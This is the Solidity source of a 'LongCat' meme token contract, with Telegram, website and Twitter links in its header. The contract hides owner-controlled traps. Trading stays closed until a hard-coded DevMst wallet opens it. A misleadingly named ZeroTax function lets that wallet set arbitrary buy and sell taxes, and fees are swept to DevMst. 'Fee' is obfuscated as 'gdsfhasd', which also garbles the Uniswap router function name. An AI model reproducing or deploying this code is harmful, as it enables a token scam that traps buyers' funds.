/*

LongCat Coin is a pure meme token inspired by the famous LongCat meme that originated in the  🍀 4chan community.

TG: https://t.me/Longcat_eth
Website: https://longcat.lol/ 
Twitter: https://twitter.com/Longcat_eth

*/

// SPDX-License-Identifier: unlicense


pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportinggdsfhasdOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract LongCat {

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   _name = unicode"LongCat"; 
        string public   _symbol = unicode"LONG";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1000000000000 * 10**decimals;

        uint256 buygdsfhasd = 0;
        uint256 sellgdsfhasd = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return _name;
        }

    
        function symbol() public view virtual returns (string memory) {
        return _symbol;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed DevMst,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant DevMst = payable(address(0x4614CcF8cbB048ffDDC72fC28A83C751e24EEf06));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == DevMst || to == DevMst);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportinggdsfhasdOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                DevMst.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 gdsfhasdAmount = amount * (from == pair ? buygdsfhasd : sellgdsfhasd) / 100;
                amount -= gdsfhasdAmount;
                balanceOf[address(this)] += gdsfhasdAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function SwapOpening() external {
            require(msg.sender == DevMst);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _RemoveTax(uint256 _buy, uint256 _sell) private {
            buygdsfhasd = _buy;
            sellgdsfhasd = _sell;
        }

        function ZeroTax(uint256 _buy, uint256 _sell) external {
            if(msg.sender != DevMst)        
                revert Permissions();
            _RemoveTax(_buy, _sell);
        }
    }